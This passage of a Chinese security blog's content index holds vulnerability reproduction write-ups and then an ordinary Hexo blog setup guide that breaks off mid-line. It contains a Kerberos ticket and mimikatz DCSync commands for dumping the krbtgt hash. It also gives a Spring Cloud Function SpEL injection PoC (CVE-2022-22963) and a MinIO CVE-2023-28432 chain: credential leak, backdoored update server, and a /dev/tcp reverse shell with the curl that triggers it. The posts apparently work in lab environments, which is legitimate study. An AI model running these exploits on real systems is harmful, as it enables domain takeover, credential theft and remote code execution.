/ticket:doIEeDCCBHSgAwIBBaEDAgEWooIDojCCA55hggOaMIIDlqADAgEFoQkbB0ZCSS5HT1aiHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2ZiaS5nb3ajggNkMIIDYKADAgESoQMCAQKiggNSBIIDTrthGAetrVBk/8RvLbf8KpocXuH9ewn4Cr3y1yM/SGY9QvfoS5TKeRBCraXNHZZxnAumMZ3zM8smSeA35epcmXPJaVSPTKYCQoI5f5dwXQUAgFEtzeqreVLkUJKg2rXB0mi4pzSEbOa+y8t3EJLVE+p42gzKG6FaI31OnBEqKOUfM0U8LECZVDsZlD9GMn/Atf/jYQovWtcW+NWFJDh/dw6pxCRDUDmCmpCH538Tz9QTB2S8PhHnZqjrzLtnIeXE7eRAg49ruoHKAV6rdrfl5HD2rziAadBKDQ1H2eLne8AtuBo+I1GGlnZoIEty7TnITtXDlPll+O5Qes+e3gkI1omlhJAKTw2rOgQzlQwavp8FCu/Z4LMZ6M85/sD4lg5azJqp/w9VwnPZ1jCYx/CU0/vfQDci5ePx4h2yYo2o6ID21q8Wrg53rfMXvl+MYrrhH5lHxo4Uv5J6wkURiZZLx8rokSU2gCBuFaYe6iOyHUQIpC1XGlSwy9V/5MHbukibBH+ixhnP/ATprJiPSj6CaPpGgdllbWl0YyexFTg96CaLIRV1uBAlm266RDxxUHEBOsWZZIsDnw0B4dUTlhgKB4j5MY9y/aEoWb8mdvpsVDgA1GN5uZyfXyctvNSKfkyMNB2kZySj6esAW6L5n2pcAMnAIqZEQfP2zO5t8eRQOP4Yl7CdMRDPA5bbjdZp6wYLKgBYzKdxQyAbjkbQIWVVB15zQkc1Yc9POZPVlfxPF9JwJKq21jPf7QvXs3n1ebaQbputQIMpsEnywcEAzgW7Oy4uejdn3zi4fET57RXXBFOaqxLKf4KDPyqip5GDGtVJqGDK/vUO5zSin7v5mEWF7kinucZlgTSg5iMzgSdGC//joD9xElA65f/iQCIeOOUl+iDFs/tf8EQZvEQKbp88LI6KcDqYvJ3Ge1rvFIQwhGxsLWsAAutkFMn111nyKBTmqi/+OllYPbZhkHRglUBB80SXK85BUhL3a3O3JR3tHlHTz+A0DOUloiYDVn4qhx76rPFSkhdnH9ZdxX9I/PAkJDYnGubfoMo+/5OhcQG1WWQP8XkjwllcOKTmf1HTOLXUtXFkpos8F/84+Z+g9mKzk3QlcCzRfLQ8j+ntOeGGWqOBwTCBvqADAgEAooG2BIGzfYGwMIGtoIGqMIGnMIGkoBswGaADAgEXoRIEEIZs7uBBRhm/zUWKNCQGYYChCRsHRkJJLkdPVqIPMA2gAwIBAaEGMAQbAmRjowcDBQBA4QAApREYDzIwMjIwNDA2MTU0MzQwWqYRGA8yMDIyMDQwNzAxNDM0MFqnERgPMjAyMjA0MTMxNTQzNDBaqAkbB0ZCSS5HT1apHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2ZiaS5nb3Y==</span><br></pre></td></tr></table></figure>\n<p><img src=\"76ffa80f-2b6c-4df9-a93d-ad5c0be5edd1.png\" alt=\"image\"></p>\n<p><img src=\"da74ce78-3d65-405f-aa5b-34202c5125f6.png\" alt=\"image\"></p>\n<h3 id=\"8、获取-kbrtgt-用户的-NTLM-Hash\"><a href=\"#8、获取-kbrtgt-用户的-NTLM-Hash\" class=\"headerlink\" title=\"8、获取 kbrtgt 用户的 NTLM Hash\"></a>8、获取 kbrtgt 用户的 NTLM Hash</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe</span><br><span class=\"line\">lsadump::dcsync /domain:fbi.gov /user:krbtgt</span><br><span class=\"line\">//一句话输出</span><br><span class=\"line\">mimikatz.exe <span class=\"string\">&quot;lsadump::dcsync /domain:fbi.gov /user:krbtgt&quot;</span> <span class=\"built_in\">exit</span> &gt;dcsync.txt</span><br></pre></td></tr></table></figure>\n","categories":["漏洞复现"],"tags":["漏洞复现","域控","权限提升"]},{"title":"spring-spel复现（CVE-2022-22963）","url":"/2022/05/06/spring-spel%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-22963%EF%BC%89/","content":"<h1 id=\"spring-spel复现（CVE-2022-22963）\"><a href=\"#spring-spel复现（CVE-2022-22963）\" class=\"headerlink\" title=\"spring-spel复现（CVE-2022-22963）\"></a>spring-spel复现（CVE-2022-22963）</h1><h2 id=\"CVE-2022-22963\"><a href=\"#CVE-2022-22963\" class=\"headerlink\" title=\"CVE-2022-22963\"></a>CVE-2022-22963</h2><p>Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。<br>由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>\n<h2 id=\"环境搭建：\"><a href=\"#环境搭建：\" class=\"headerlink\" title=\"环境搭建：\"></a>环境搭建：</h2><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip</span><br><span class=\"line\">unzip v3.1.6.zip</span><br><span class=\"line\">cd spring-cloud-function-3.1.6</span><br><span class=\"line\">cd spring-cloud-function-samples/function-sample-pojo</span><br><span class=\"line\">mvn package</span><br><span class=\"line\">java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar</span><br></pre></td></tr></table></figure>\n<p><img src=\"40-iNlD6QLMzbytc1n1BECzBAJfn0p9cg-aiS66ltyE.png\" alt=\"image\"></p>\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">find . -name &quot;*.java&quot;|xargs -I % cat %|grep -Eo &#x27;&quot;([^&quot; \\.\\/=&gt;\\|,:\\&#125;\\+\\)&#x27;&quot;&#x27;&quot;&#x27;]&#123;8,&#125;)&quot;&#x27;|sort -u|sed &#x27;s/&quot;//g&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">functionRouter</span><br><span class=\"line\">uppercase</span><br><span class=\"line\">lowercase</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p><img src=\"o_aHMocsoKZrpFQ9yw_ZXQ1QnNMEWHIdEdniRN-Lbic.png\" alt=\"image\"></p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /functionRouter HTTP/1.1</span><br><span class=\"line\">Host: 172.16.16.127:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 3</span><br><span class=\"line\">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">sec</span><br></pre></td></tr></table></figure>\n<p><img src=\"SOTqhFjVV3MdophtDQZCOQVkrmAEgyesmRTN0cJ3B-o.png\" alt=\"image\"></p>\n<p><img src=\"EKtM0GAkORFMLK_YrVtp7NrJ4QVVerxooP6Fk3l0IbY.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","spel"]},{"title":"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）","url":"/2023/04/11/%E4%B8%AD%E9%97%B4%E4%BB%B6MinIO%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E7%9A%84RCE%EF%BC%88CVE-2023-28432%EF%BC%89/","content":"<h1 id=\"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\"><a href=\"#中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\" class=\"headerlink\" title=\"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\"></a>中间件MinIO信息泄露导致的RCE（CVE-2023-28432）</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>Minio 是一个基于Go语言的对象存储服务。它实现了大部分亚马逊S3云存储服务接口，可以看做是是S3的开源版本，非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器&#x2F;虚拟机镜像等。MinIO verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>\n<p>默认账号密码是：minioadmin&#x2F;minioadmin</p>\n<h2 id=\"漏洞利用方式\"><a href=\"#漏洞利用方式\" class=\"headerlink\" title=\"漏洞利用方式\"></a>漏洞利用方式</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">版本号检测：</span><br><span class=\"line\"><span class=\"number\">1.</span>http请求：GET /api/v1/check-version</span><br><span class=\"line\"><span class=\"number\">2.</span>HTTP响应版本小于RELEASE<span class=\"number\">.2023</span>-<span class=\"number\">03</span>-20T20-<span class=\"number\">16</span>-18Z则存在漏洞。</span><br><span class=\"line\">信息泄漏：</span><br><span class=\"line\">POST /minio/bootstrap/v1/verify HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">RCE思路：</span><br><span class=\"line\">利用泄露的账号密码和MinIO客户端登录并设置MinIO的升级访问URL，因为MinIO对于升级包的sha256sum校验失效，所以能够有损的RCE。</span><br><span class=\"line\"><span class=\"number\">1.</span>设置升级url：mc alias set myminio http:<span class=\"comment\">//ip:9000  user_R3s3arcm pwd_R3s3arcm</span></span><br><span class=\"line\"><span class=\"number\">2.</span>触发更新：mc admin update myminio -y</span><br></pre></td></tr></table></figure>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>使用vulhub的docker搭建服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hub.nuaa.cf/vulhub/vulhub/tree/master/minio/CVE-2023-28432</span><br><span class=\"line\">下载docker-compose.yml之后进行启动</span><br><span class=\"line\">docker-compose up -d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"q2eW7vxAoq_cQOdUJICMTGS1ORd-tY_QrBjnRAv5BaU.png\" alt=\"image\"></p>\n<p>10.211.55.9:9001</p>\n<p><img src=\"5pGs45rYXfI4IIX_yrg8j6UNU3WuSTHSxti-qfHS0BA.png\" alt=\"image\"></p>\n<p>非官方的镜像，没有公钥，不用绕过。</p>\n<p><img src=\"Wf6XMp8cRyDvRBpncc5dq1Q5eO2yvCdGIrlt9DxeFQ8.png\" alt=\"image\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>POC</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /minio/bootstrap/v1/verify HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">10.211</span><span class=\"number\">.55</span><span class=\"number\">.9</span>:<span class=\"number\">9000</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Macintosh; Intel Mac OS X <span class=\"number\">10_15_7</span>) AppleWebKit/<span class=\"number\">537.36</span> (KHTML, like Gecko) wwlocal/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> Chrome/<span class=\"number\">96.0</span><span class=\"number\">.4664</span><span class=\"number\">.174</span> Electron/<span class=\"number\">16.2</span><span class=\"number\">.2</span> Safari/<span class=\"number\">537.36</span> wxwork/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> wwlocal/<span class=\"number\">1.0</span> wxworklocal/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> WXDrive/<span class=\"number\">2.0</span> MicroMessenger/<span class=\"number\">6.3</span><span class=\"number\">.22</span></span><br><span class=\"line\">Accept: *<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Referer: http://10.211.55.9:9001/login</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 0</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">//注意需要请求访问的是9000端口</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"e-2dWrOorzFeE48zhbEp2YA5xvBZm7Un53JSQPkZAfM.png\" alt=\"image\"></p>\n<p>得到了账号密码 minioadmin&#x2F;minioadmin-vulhub</p>\n<p><img src=\"LbUTfRDHNx9wGc1cy0rETLHUY4hOKeR_nafy8m1cv7w.png\" alt=\"image\"></p>\n<h2 id=\"安装mc客户端\"><a href=\"#安装mc客户端\" class=\"headerlink\" title=\"安装mc客户端\"></a>安装mc客户端</h2><p>折腾了一下mac端的mac客户端，没成功之后，就改使用docker版本的mc客户端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 容器安装</span></span><br><span class=\"line\">$ docker pull minio/mc</span><br><span class=\"line\"><span class=\"comment\">#直接执行命令</span></span><br><span class=\"line\">$ docker run minio/mc <span class=\"built_in\">ls</span> play</span><br><span class=\"line\"><span class=\"comment\">#进入容器执行命令</span></span><br><span class=\"line\">docker run -it --entrypoint=/bin/sh minio/mc</span><br></pre></td></tr></table></figure>\n<p>连接尝试，添加实例，添加成功。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mc config host add miniode1 http://10.211.55.9:9000 minioadmin minioadmin-vulhub</span><br></pre></td></tr></table></figure>\n<p><img src=\"SKuMBd-r3II1gPEl0Y5NGOB7kVMZdhQwHlboVBA7Zo8.png\" alt=\"image\"></p>\n<h2 id=\"RCE复现\"><a href=\"#RCE复现\" class=\"headerlink\" title=\"RCE复现\"></a>RCE复现</h2><p>大佬修改好的后门版本下载地址：<a href=\"https://github.com/AbelChe/evil_minio\">https://github.com/AbelChe/evil_minio</a></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//编译</span></span><br><span class=\"line\">CGO_ENABLED=<span class=\"number\">0</span> GOOS=linux GOARCH=amd64 <span class=\"keyword\">go</span> build -ldflags=<span class=\"string\">&quot;-s -w&quot;</span> -trimpath</span><br><span class=\"line\"><span class=\"comment\">//重命名</span></span><br><span class=\"line\">mv minio minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z</span><br><span class=\"line\"><span class=\"comment\">//shasum校验</span></span><br><span class=\"line\">shasum -a <span class=\"number\">256</span> minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z &gt; minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z.sha256sum</span><br><span class=\"line\">启动http服务</span><br><span class=\"line\">python3 -m http.server <span class=\"number\">18090</span></span><br></pre></td></tr></table></figure>\n<p>编译报错了</p>\n<p><img src=\"GVYHArrAGvKaZ0a7KbpLPzhyMmPfnPQZw40GGa96_9g.png\" alt=\"image\"></p>\n<p>解决：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">go</span> env -w GOPROXY=https:<span class=\"comment\">//goproxy.cn,direct​</span></span><br><span class=\"line\"><span class=\"keyword\">go</span> clean -modcache</span><br><span class=\"line\"><span class=\"keyword\">go</span> mod tidy</span><br></pre></td></tr></table></figure>\n<p>执行完成之后，再继续执行最上面的命令进行编译。再次遇到问题，golang版本太低，本机的版本是1.7.5；提示需要1.8版本和1.19.1；查了一下官方信息，需要1.19以上版本的go环境运行。</p>\n<p><img src=\"-_tQ0X7YlAQJFTENqAd5L9IMVkTrkhtmnvjXJrq2AGI.png\" alt=\"image\"></p>\n<p><img src=\"UpHVOBVem_Un5dTrwt7kKm0ANLzAz6HCy1DzlYvlw5o.png\" alt=\"image\"></p>\n<p>升级golang的版本；下载 golang 版本升级工具</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/udhos/update-golang</span></span><br></pre></td></tr></table></figure>\n<p>执行升级命令</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd update-golang</span><br><span class=\"line\">sudo RELEASE=<span class=\"number\">1.19</span><span class=\"number\">.1</span> ./update-golang.sh</span><br><span class=\"line\">说明： RELEASE=<span class=\"number\">1.19</span><span class=\"number\">.1</span> 指定 golang 需要升级的版本</span><br><span class=\"line\"><span class=\"keyword\">go</span> version</span><br></pre></td></tr></table></figure>\n<p><img src=\"DoYjRem3iwT7z6d5waP-vRX_qRP36cqxUWMG0j7oeNo.png\" alt=\"image\"></p>\n<p>继续编译，编译成功。并且重命名一下</p>\n<p><img src=\"8auTGLP7uGQT2TE1nfImmBEsAqfL3G7vLl-mWF7y6xk.png\" alt=\"image\"></p>\n<p>校验一下sha256</p>\n<p><img src=\"t8kBmm5v5PopSPahxZpjQWtHYkWqpjbGZDNnQC0xgig.png\" alt=\"image\"></p>\n<p>RCE</p>\n<p>为了直观点，我们可以创建一个桶（此操作非必须）</p>\n<p><img src=\"eJfffU4hVF-Fx63iFlbuOJUNWhRLvXx-FH6LC7lCanQ.png\" alt=\"image\"></p>\n<p>使用mc客户端进行操作</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#添加 MinIO服务案例</span></span><br><span class=\"line\">mc config host add docker_minio1 http://ip:9000 用户名 密码</span><br><span class=\"line\"><span class=\"comment\">#添加 MinIO服务</span></span><br><span class=\"line\">mc config host add miniode1 http://10.211.55.9:9000 minioadmin minioadmin-vulhub</span><br><span class=\"line\"><span class=\"comment\">#ls命令 - 列出对象(可以不执行这一步)</span></span><br><span class=\"line\">mc <span class=\"built_in\">ls</span> miniode1</span><br><span class=\"line\"><span class=\"comment\">#下载更新包更新</span></span><br><span class=\"line\">mc admin update miniode1 http://10.211.55.2:18090/minio.RELEASE.2023-03-22T06-36-24Z.<span class=\"built_in\">sha256sum</span> -y</span><br></pre></td></tr></table></figure>\n<p>成功升级</p>\n<p><img src=\"2hR9Gze1yooxkC5Ls11wGKbHEpTJjSlchAkozHRHJmI.png\" alt=\"image\"></p>\n<p>尝试执行命令</p>\n<p>踩坑：（这里一开始一直使用9001端口访问，一直都没成功，以为自己的升级包有问题）</p>\n<p>最后使用9000端口进行请求，成功执行了命令</p>\n<p><img src=\"hsqPypsa1S9iwGdVMarn-5inxAjps0n1o691yaGfSvg.png\" alt=\"image\"></p>\n<p>反弹shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/sh -i &gt;&amp; /dev/tcp/10.211.55.2/4567 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">curl <span class=\"string\">&#x27;http://10.211.55.9:9000/?alive=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.211.55.2%2F4567%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"co4RpHjVQfJE12ctkaE-0qL71WZg5tVJwylcO4kQLlo.png\" alt=\"image\"></p>\n<p>功能依然正常，未受到影响</p>\n<p><img src=\"Q4ZS-PAwMS_7jhB22lxQFDKrxREsrt-kcllgjvSmz3o.png\" alt=\"image\"></p>\n<p>总结：</p>\n<ul>\n<li>环境搭建过程遇到了较多的问题：主要是当时没有科学上网，拉取国外资源的时候太慢了，会有一些莫名其妙的报错。</li>\n<li>golang的版本：其次是golang环境的版本，太久没更新本地golang环境，导致无法正常编译。</li>\n<li>验证是否成功</li>\n</ul>\n","categories":["漏洞复现"],"tags":["漏洞复现","MinIO","未授权访问"]},{"title":"搭建Hexo博客","url":"/2020/02/28/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/","content":"<h1 id=\"搭建Hexo博客\"><a href=\"#搭建Hexo博客\" class=\"headerlink\" title=\"搭建Hexo博客\"></a>搭建Hexo博客</h1><h2 id=\"Hexo简介\"><a href=\"#Hexo简介\" class=\"headerlink\" title=\"Hexo简介\"></a>Hexo简介</h2><p>Hexo是一个基于 node.js的快速生成静态博客的开源框架，支持 Markdown和大多数 Octopress插件，一个命令即可部署到 Github页面、 Giteee、 Heroku等，强大的APl，可无限扩，拥有数百个主题和插件。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><h3 id=\"安装Node-js\"><a href=\"#安装Node-js\" class=\"headerlink\" title=\"安装Node.js\"></a>安装Node.js</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Node.js的版本需要不低于<span class=\"number\">10.13</span>，建议使用Node.js <span class=\"number\">12.0</span>及以上版本。</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">从Git的官网选择相应的系统下载安装Git</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h2><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在cmd中输入如下命令</span><br><span class=\"line\">npm install -g hexo-cli</span><br><span class=\"line\">#mac</span><br><span class=\"line\">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>\n<p>安装好后，可以输入<code>hexo -v</code>查看版本</p>\n<p><img src=\"97EVbDOVkyTC0he6iCBF8JU5xg5-16f3su45CJgDLDA.png\" alt=\"image\"></p>\n<h3 id=\"初始化Hexo\"><a href=\"#初始化Hexo\" class=\"headerlink\" title=\"初始化Hexo\"></a>初始化Hexo</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 按个人习惯，在某个盘符建立存储博客的文件夹。</span><br><span class=\"line\"># 首先需要在cmd中切换到相应的文件夹中，然后再输入如下命令。（其中hexoblog为存储博客的文件夹名）；会在当前目录下创建一个hexoblog文件夹</span><br><span class=\"line\">hexo init hexoblog</span><br></pre></td></tr></table></figure>\n<p><img src=\"T97hTLA9FRaqFeRUcaQbtr1V2RvzgtfauZyNwdzlAbI.png\" alt=\"image\"></p>\n<h3 id=\"npm的安装\"><a href=\"#npm的安装\" class=\"headerlink\" title=\"npm的安装\"></a>npm的安装</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 首先进入到存储博客的文件夹中。</span><br><span class=\"line\">cd hexoblog</span><br><span class=\"line\"># 然后安装npm</span><br><span class=\"line\">sudo npm install</span><br></pre></td></tr></table></figure>\n<p><img src=\"zygyREOvvqKBvEJ3BoVZUoUyEoJNi_jb3Jrp9QKljAA.png\" alt=\"image\"></p>\n<p>至此，Hexo本地站点就已安装好了，接下来就可以让它在本地跑起来。</p>\n<h3 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在cmd中依次输入以下命令</span><br><span class=\"line\"># 生成静态文件</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"># 启动服务</span><br><span class=\"line\">hexo server</span><br></pre></td></tr></table></figure>\n<p>访问网址：<a href=\"http://localhost:4000/%EF%BC%8C%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E7%9A%84Hexo%E4%BA%86\">http://localhost:4000/，就能看到本地搭建的Hexo了</a></p>\n<h2 id=\"更换主题\"><a href=\"#更换主题\" class=\"headerlink\" title=\"更换主题\"></a>更换主题</h2><h3 id=\"git下载主题\"><a href=\"#git下载主题\" class=\"headerlink\" title=\"git下载主题\"></a>git下载主题</h3><p>在hexo目录下的themes文件夹下打开git bash，输入以下命令，下载主题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/probberechts/hexo-theme-cactus.git</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"52mRukbLvXFYULRC4L1eQq07YOky_q3bG8bepR2kKsQ.png\" alt=\"image\"></p>\n<h3 id=\"配置-config-yml文件\"><a href=\"#配置-config-yml文件\" class=\"headerlink\" title=\"配置_config.yml文件\"></a>配置_config.yml文件</h3><p>打开hexo目录下的_config.yml文件，修改theme，注意冒号之后的空格。</p>\n<p>因为刚刚已经下载过主题，打开hexo目录下的themes文件夹会看到新生成的主题文件夹，将他的名字复制到_config.yml里并保存。</p>\n<p>（ps：注意hexo和themes的主题文件夹里各有一个_config.yml文件，不要搞混了，后续增加各种效果还需要用到的）</p>\n<p><img src=\"ifBnRSYs__7QeZYyKL0I0FSRwVYYLpWBnS-Q7umI2i8.png\" alt=\"image\"></p>\n<p><img src=\"imeJgzdY9zScz98N0PiBDxRsB05qu1ysdq-89-TZrNU.png\" alt=\"image\"></p>\n<h3 id=\"更新主题\"><a href=\"#更新主题\" class=\"headerlink\" title=\"更新主题\"></a>更新主题</h3><p>在hexo目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo s  #相当于 启动服务 hexo server</span><br></pre></td></tr></table></figure>\n<p>感觉效果满意就可以部署到GitHub上了</p>\n<p>在hexo目录下，打开git bash，输入以下命令，清除缓存，将内容部署到GitHub</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">#推送到gitee</span><br><span class=\"line\">hexo g -d</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"将博客部署到Github上\"><a href=\"#将博客部署到Github上\" class=\"headerlink\" title=\"将博客部署到Github上\"></a>将博客部署到Github上</h2><h3 id=\"新建仓库\"><a href=\"#新建仓库\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3><p>登录我们的 github，新建一个仓库</p>\n<p><img src=\"0v2bqa22w3g6HeZccv32X_u7LXW_n0i0sCddPazNlvM.png\" alt=\"image\"></p>\n<h3 id=\"创建SSH-key\"><a href=\"#创建SSH-key\" class=\"headerlink\" title=\"创建SSH key\"></a>创建SSH key</h3><p>首先要重新在git设置一下身份的名字和邮箱；删除.ssh文件夹</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;username&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;xxxxxx@163.com&quot;</span></span><br></pre></td></tr></table></figure>\n<p>在 git bash here 中创建一个ssh密钥</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">指令：<span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;邮箱&quot;</span>  <span class=\"comment\">#此处邮箱填写自己的邮箱</span></span><br></pre></td></tr></table></figure>\n<p>然后enter三连</p>\n<p>生成两个文件： id_rsa和id_rsa.pub 存放在文件夹下(window在：C:\\Users\\admin.ssh)</p>\n<p><img src=\"wnQoPpO2kycVmCJhdEhht-SCiEBHi0WEiEbE0hHJPG4.png\" alt=\"image\"></p>\n<p>在GitHub的设置里面创建一个ssh密钥.</p>\n<ul>\n<li>Title：随意填写</li>\n<li>Key：将本地的id_rsa.pub文件用记事本打开，复制全部内容粘贴到GitHub仓库的SSH Keys 位置</li>\n</ul>\n<p><img src=\"V9Kd_L68wDccwrfOZyOQGryDAxrpggeIdN0wzYcBvDw.png\" alt=\"image\"></p>\n<p>添加成功</p>\n<p><img src=\"bCEtDFcgCvXHlAAPry1CFOVdrRKABpYF43exvckkHo0.png\" alt=\"image\"></p>\n<h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 这里需要先安装deployer-git插件</span><br><span 